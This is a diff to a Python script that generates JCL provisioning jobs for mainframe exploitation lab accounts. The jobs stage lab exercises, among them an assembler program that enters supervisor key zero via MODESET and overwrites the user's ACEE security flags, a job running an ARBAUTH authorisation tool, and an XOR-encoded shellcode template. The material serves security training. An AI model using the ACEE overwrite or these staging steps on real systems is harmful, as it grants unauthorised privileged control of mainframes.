@@ -33,32 +33,6 @@ USERJOB = ('''//{usern} JOB (1),'ADD {usern}',CLASS=S,MSGLEVEL=(1,1),
 //JCLLIB   DD  DSN={usern}.JCLLIB,DISP=(NEW,CATLG),
 //             UNIT=SYSDA,VOL=SER=PUB000,
 //             SPACE=(CYL,(1,1,20)),DCB=SYS1.MACLIB 
-//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
-//COPYTHEM EXEC PGM=IEBCOPY
-//SYSPRINT DD SYSOUT=*
-//* SYSUT1 is source SYSUT2 is destination
-//SYSUT1 DD DSN=MAYHEM.OPS,DISP=SHR
-//SYSUT2 DD DSN={usern}.OPS,DISP=SHR
-//SYSIN DD DUMMY
-//* 
-//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
-//*
-//COPYOVRF EXEC PGM=IEBCOPY
-//SYSPRINT DD SYSOUT=*
-//* SYSUT1 is source SYSUT2 is destination
-//SYSUT1 DD DSN=MAYHEM.EXEC,DISP=SHR
-//SYSUT2 DD DSN={usern}.EXEC,DISP=SHR
-//SYSIN DD DUMMY
-//*
-//* 
-//* COPY ALL MEMBERS FROM ONE PDS TO ANOTHER
-//*
-//COPYOVRF EXEC PGM=IEBCOPY
-//SYSPRINT DD SYSOUT=*
-//* SYSUT1 is source SYSUT2 is destination
-//SYSUT1 DD DSN=MAYHEM.FTPDUMP,DISP=SHR
-//SYSUT2 DD DSN={usern}.FTPDUMP,DISP=SHR
-//SYSIN DD DUMMY
 //*
 //COPYSRC  EXEC PGM=IEBCOPY
 //SYSPRINT DD SYSOUT=*
@@ -67,9 +41,285 @@ USERJOB = ('''//{usern} JOB (1),'ADD {usern}',CLASS=S,MSGLEVEL=(1,1),
 //SYSUT2 DD DSN={usern}.SOURCE,DISP=SHR
 //SYSIN DD DUMMY
 //* 
+//COPYEXEC EXEC PGM=IEBCOPY
+//SYSPRINT DD SYSOUT=*
+//* SYSUT1 is source SYSUT2 is destination
+//SYSUT1 DD DSN=MAYHEM.EXEC,DISP=SHR
+//SYSUT2 DD DSN={usern}.EXEC,DISP=SHR
+//SYSIN DD DUMMY
+//* 
+//LINK    EXEC PGM=IEWL,PARM='MAP,LIST,XREF,NORENT',REGION=1024K
+//SYSPRINT  DD SYSOUT=A
+//SYSLMOD   DD DISP=SHR,DSN={usern}.LOAD(HELLO)
+//SYSUT1    DD UNIT=SYSDA,SPACE=(CYL,(5,1))
+//SYSLIN    DD DATA,DLM=$$
+::E GETSPLOIT/hello.load
+$$
+//*
+//STORE   EXEC PGM=IEBUPDTE,REGION=1024K,PARM=NEW
+//SYSPRINT  DD SYSOUT=*
+//SYSUT2    DD DSN={usern}.JCLLIB,DISP=SHR
+//SYSIN     DD DATA,DLM=$$
+./ ADD NAME=LAB01,LIST=ALL
+//{usern}LAB1 JOB (TSO),
+//             'Normal Run',
+//             CLASS=A,
+//             MSGCLASS=H,
+//             MSGLEVEL=(1,1),NOTIFY=&SYSUID
+//RUN    EXEC PGM=HELLO,REGION=0M
+//SYSPRINT  DD SYSOUT=*
+//STDOUT    DD SYSOUT=*
+//STDIN     DD *
+TESTRUN
+//*
+//STEPLIB   DD DISP=SHR,DSN={usern}.LOAD
+./ ADD NAME=LAB05,LIST=ALL
+//{usern}LAB5  JOB (TSO),                   
+//             'RUN OPENTEST',            
+//             CLASS=A,                   
+//             MSGCLASS=H,                
+//             MSGLEVEL=(2,1),            
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID             
+//OPENTST   EXEC PGM=OPENTST              
+//SYSPRINT DD   SYSOUT=A                  
+//STEPLIB  DD   DISP=SHR,DSN=SYSC.LINKLIB 
+//SYSUDUMP DD   DISP=SHR,DSN={usern}.DUMP003                  
+//INPUTDD  DD   *                         
+<CHANGE TO YOUR USERNAME>                                      
+//*
+./ ADD NAME=LAB08,LIST=ALL
+//{usern}LAB8   JOB (TSO),                                     
+//             'COMP WTOPOC',                              
+//             CLASS=A,                                    
+//             MSGCLASS=H,                                 
+//             MSGLEVEL=(2,1),                             
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID                                     
+//ASMLKD1 EXEC ASMFCL,                                     
+//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
+//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
+//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
+//            DD   DSN=SYS2.MACLIB,DISP=SHR                
+//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
+//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSIN   DD *,DLM=@@                                  
+WTOPOC   CSECT                                             
+*                                                          
+* PREFIX TO SIMULATE R14 RETURN                            
+*                                                          
+         LR    R14,R15                                     
+         LA    R14,16(R14)                                 
+         BC    15,0(,R14)                                  
+         NOPR  0                                           
+EYE4     DC    XL4'CAFEBABE'                               
+         USING *,R12                                       
+*                                                          
+* WTO AND THEN EXIT                                        
+*                                                          
+COPY     LR    R12,R14                                     
+         LA    R1,MSGWTO                                   
+         SVC   35                                          
+         SVC   03                                          
+MSGWTO   DC    XL4'00100000'                               
+         DC    C'WTO HAS RUN!'                             
+EYE1     DC    XL4'CAFEBABE'                               
+         YREGS                                             
+         END   WTOPOC CSECT                                
+@@                                                         
+//LKED.SYSLMOD  DD DSN={usern}.LOAD(WTOPOC),DISP=SHR  
+//LKED.SYSPRINT DD   SYSOUT=* 
+./ ADD NAME=LAB09,LIST=ALL
+//{usern}LAB9   JOB (TSO),                   
+//             'RUN ARBAUTH',            
+//             CLASS=A,                   
+//             MSGCLASS=H,                
+//             MSGLEVEL=(2,1),            
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID 
+//ARBAUTH   EXEC PGM=ARBAUTH,            
+// PARM='IEFBR14 '                       
+//SYSPRINT DD   SYSOUT=*                 
+//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
+//         DD   DISP=SHR,DSN=SYSC.LINKLIB 
+//SYSUDUMP DD   SYSOUT=*      
+./ ADD NAME=LAB11,LIST=ALL
+//{usern}LB11   JOB (TSO),                                     
+//             'COMP ACEEJOB',                              
+//             CLASS=A,                                    
+//             MSGCLASS=H,                                 
+//             MSGLEVEL=(2,1),                             
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID                                    
+//ASMLKD1 EXEC ASMFCL,                                     
+//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
+//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
+//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
+//            DD   DSN=SYS2.MACLIB,DISP=SHR                
+//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
+//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSIN   DD DATA,DLM=@@                                  
+ACEEJOB  CSECT                                             
+*
+* PREFIX TO SIMULATE R14 RETURN
+*
+         LR    R14,R15
+         LA    R14,16(R14)
+         BC    15,0(,R14)
+         NOPR  0
+EYE4     DC    XL4'CAFEBABE'
+         USING *,R12
+*
+* ENTER KEY ZERO
+*   
+COPY     LR    R12,R14
+         LA    R1,60
+* MODESET KEY=ZERO,MODE=SUP
+         SVC   107
+*
+* LOAD ACEE
+*       
+         L R5,X'224'           POINTER TO ASCB
+         L R5,X'6C'(R5)         POINTER TO ASXB
+         L R5,X'C8'(R5)         POINTER TO ACEE   
+*
+* WRITE ACEE
+*       
+         NI X'26'(R5),X'00'
+         OI X'26'(R5),X'B1' 
+*
+* EXIT
+*      
+         LA    R1,MSGCOMPL   
+         SVC   35                 
+         SVC   03
+MSGCOMPL DC XL4'00140000'
+         DC C'WRITING COMPLETE'
+EYE1     DC    XL4'CAFEBABE'
+         YREGS
+         END    
+@@               
+//LKED.SYSLMOD  DD DSN={usern}.LOAD(ACEEJOB),DISP=SHR  
+//LKED.SYSPRINT DD   SYSOUT=*   
+./ ADD NAME=LAB13,LIST=ALL
+//{usern}LB13   JOB (TSO),                                     
+//             'COMP WTOSML',                              
+//             CLASS=A,                                    
+//             MSGCLASS=H,                                 
+//             MSGLEVEL=(2,1),                             
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID                                    
+//ASMLKD1 EXEC ASMFCL,                                     
+//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
+//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
+//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
+//            DD   DSN=SYS2.MACLIB,DISP=SHR                
+//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
+//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSIN   DD DATA,DLM=@@                                  
+WTOSML   CSECT
+*
+* PREFIX TO SIMULATE R14 RETURN
+*
+         LR    R14,R15
+         LA    R14,16(R14)
+         BC    15,6(,R14)
+         NOPR  0
+EYE4     DC    XL4'CAFEBABE'
+         USING *,R14
+*
+* WTO AND THEN EXIT
+*
+         DS    XL6
+COPY     LA    R1,MSGWTO
+         SVC   35
+         SVC   03
+MSGWTO   DC    XL4'000C0000'
+         DC    C'RINGRING'  
+EYE1     DC    XL4'CAFEBABE'
+         YREGS
+         END  
+@@               
+//LKED.SYSLMOD  DD DSN={usern}.LOAD(WTOSML),DISP=SHR  
+//LKED.SYSPRINT DD   SYSOUT=*          
+./ ADD NAME=LAB14,LIST=ALL
+//{usern}LB14   JOB (TSO),                                     
+//             'COMP WTOSML',                              
+//             CLASS=A,                                    
+//             MSGCLASS=H,                                 
+//             MSGLEVEL=(2,1),                             
+//             REGION=0K,                 
+//             NOTIFY=&SYSUID                                    
+//ASMLKD1 EXEC ASMFCL,                                     
+//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',  
+//             PARM.LKED='LET,MAP,XREF,LIST,TEST'          
+//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR                
+//            DD   DSN=SYS2.MACLIB,DISP=SHR                
+//            DD   DSN=SYS1.AMODGEN,DISP=SHR               
+//            DD   DSN=SYS1.AMACLIB,DISP=SHR               
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSTERM DD SYSOUT=*                                  
+//ASM.SYSIN   DD DATA,DLM=@@                                  
+AWTOXOR  CSECT
+*
+* PREFIX TO SIMULATE R14 RETURN
+*
+         LR    R14,R15
+         LA    R14,16(R14)
+         BC    15,0(,R14)
+         NOPR  0
+EYE4     DC    XL4'CAFEBABE'
+         USING *,R14
+*
+* ENTER XOR BYTES
+*
+COPY     XC    WTOJOBX,XORKEY
+*
+* WTOSML XORED
+* USING *,R14
+* DS    XL6
+* LA    R1,MSGWTO
+* SVC   35
+* SVC   03
+* DC    XL4'00070000'
+* DC    C'WTO'
+*
+WTOJOBX  DS    0XL21                        
+         DC    X'<PUT XORED SHELLCODE HERE>'
+*                                           
+* XOR KEY                                   
+*                                           
+XORKEY   DS    0XL21                        
+         DC    X'<PUT XOR KEY HERE>'        
+EYE1     DC    XL4'CAFEBABE'
+         YREGS
+         END
+@@               
+//LKED.SYSLMOD  DD DSN={usern}.LOAD(WTOSMLX),DISP=SHR  
+//LKED.SYSPRINT DD   SYSOUT=*                   
+./ ADD NAME=BONUS01,LIST=ALL
+//BONUS01  JOB (TSO),
+//             'RUN FIXDSCB',
+//             CLASS=A,
+//             MSGCLASS=H,
+//             MSGLEVEL=(1,1),
+//             REGION=0K
+//FIXDSCB    EXEC PGM=FIXDSCB
+//SYSPRINT DD   SYSOUT=A
+//STEPLIB  DD   DISP=SHR,DSN=SYSC.LINKLIB
+//SYSIN    DD   *
+EXTEND  VOLUME=MVSRES,DSNAME=SYS1.LINKLIB
+//*
+$$
 ''')
 
-for x in range(0,2):
+for x in range(0,23):
     with open("users/MH{}.jcl".format(str(x).zfill(2)), 'w') as jclfile:
         print("*** Writting users/MH{}.jcl".format(str(x).zfill(2)))
         jclfile.write(USERJOB.format(usern="MH{}".format(str(x).zfill(2))))
